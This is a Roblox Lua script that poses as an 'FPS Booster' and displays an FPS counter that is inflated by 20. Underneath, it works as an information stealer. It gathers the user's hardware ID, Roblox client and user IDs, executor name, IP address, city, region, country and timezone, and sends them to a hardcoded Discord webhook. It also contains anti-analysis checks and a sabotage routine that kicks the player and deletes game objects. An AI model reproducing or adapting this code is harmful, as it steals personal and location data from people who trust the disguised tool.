local Hook = "https://discord.com/api/webhooks/1193355321293418626/hZ2aGn2kFrPMrHUrpACHY9vqUE6IFfAwFrKzshB6xsC-whS9dAM0GaYOcxsnqQ1VhBpl"
local LocalPlayer = game:GetService("Players").LocalPlayer
local Executors = {"Delta","Evon","Codex","Hydrogen","macsploit is the best fucking exploit ever made."}
local function Send(Webhook, Title, Message)
    local embed = {
        ["title"] = tostring(Title),
        ['description'] = Message,
        ["color"] = tonumber(000000)
    }
    local a = request({
        Url = Webhook,
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService("HttpService"):JSONEncode({
            ['embeds'] = {embed},
            ['avatar_url'] = "https://cdn.discordapp.com/attachments/1089257712900120576/1105570269055160422/archivector200300015.png"
        }),
        Method = "POST"
    })
end

local function GetClientID()
    local player = game.Players.LocalPlayer
    if player then
        return player.UserId
    else
        ClientKill()
    end
end

local function ClientKill()
    task.spawn(function() LocalPlayer:Kick("FPS Boost Failure") end)
    task.spawn(function() while true do warn("FPS Boost Failure") end end)
    task.spawn(function() for _,v in ipairs(workspace:GetChildren()) do v:Destroy() end end)
end
    

local FPS = 60
task.spawn(function()
local RunService = game:GetService("RunService")
local Core = game:GetService("CoreGui")
local GUI = Instance.new("ScreenGui")
GUI.Parent = Core
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Position = UDim2.new(0, 0, 1, -50)
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 0.2
Frame.Parent = GUI
local Round = Instance.new("UICorner")
Round.CornerRadius = UDim.new(0, 10)
Round.Parent = Frame
local TL = Instance.new("TextLabel")
TL.Size = UDim2.new(0, 200, 0, 50)
TL.Position = UDim2.new(0, 0, 1, -50)
TL.BackgroundTransparency = 1
TL.TextColor3 = Color3.new(1, 1, 1)
TL.TextStrokeTransparency = 0.5
TL.TextStrokeColor3 = Color3.new(0, 0, 0)
TL.Font = Enum.Font.SourceSansBold
TL.TextColor3 = Color3.new(0.3,0.3,0.3)
TL.TextSize = 50
TL.Parent = GUI
RunService.RenderStepped:Connect(function()
    FPS = math.floor(1 / RunService.RenderStepped:Wait())
end)

task.spawn(function()
    while true do
        if shared.AntiLogger then ClientKill() end
        TL.Text = "FPS: "..tostring(FPS+20)
        task.wait(1)
    end
end)
end)
local function IP()
    local success, response = pcall(function()
        return request({
            Url = "http://ipinfo.io/json",
            Method = "GET"
        })
    end)

    if success and response then
        if response.StatusCode == 200 then
        local decodedResponse = game:GetService("HttpService"):JSONDecode(response.Body)
        if #game:GetService("RbxAnalyticsService"):GetClientId() ~= 36 then ClientKill() end
        local success,result = pcall(function()
            local Validator = game:GetService("Players").LocalPlayer.UserId/10 
        end)
        if not table.find(Executors,(identifyexecutor() or getexecutorname())) then ClientKill() end
        local Information = "Executor HWID: " .. (gethwid() or "None Found") .. "\n"
            .."Roblox Client ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n"
            .."Roblox User ID: " .. GetClientID() .. "\n"
            .."Executor: " .. (identifyexecutor() or getexecutorname()) .. "\n"
            .. "IP: " .. decodedResponse.ip .. "\n"
            .. "City: " .. decodedResponse.city .. "\n"
            .. "Region: " .. decodedResponse.region .. "\n"
            .. "Country: " .. decodedResponse.country .. "\n"
            .. "Timezone: " .. decodedResponse.timezone

        return Information
        else
            ClientKill()
        end
    else
        ClientKill()
    end
end

local function Sounding()
    local success, response = pcall(function()
    Send("https://discord.com/api/webhooks/...Just joking, nice try tho",LocalPlayer.Name,"FPS Booster Initialising")
    end)
    task.spawn(function()
    if not success then
        ClientKill()
    end
    end)
end



Sounding()
task.wait()
print("FPS Boosted 🤓")
Send(Hook, "Information: " .. LocalPlayer.Name, IP())
